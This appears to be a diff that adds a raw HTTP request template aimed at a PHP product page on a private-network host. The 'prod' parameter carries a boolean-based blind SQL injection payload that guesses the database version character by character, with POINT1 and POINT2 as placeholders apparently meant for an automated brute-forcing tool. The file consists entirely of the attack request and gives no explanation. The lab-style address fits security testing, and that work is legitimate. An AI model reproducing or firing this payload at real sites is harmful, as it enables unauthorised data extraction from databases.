@@ -1,0 +1,10 @@
+GET /details.php?prod=2+AND+(SUBSTRING((SELECT+@@version),1,POINT1)='POINT2')+--&type=1 HTTP/1.1
+Host: 192.168.171.132
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en,el-GR;q=0.8,el;q=0.5,en-US;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.171.132/products.php?type=1
+Cookie: level=1; lang=USD
+Connection: close
+Upgrade-Insecure-Requests: 1
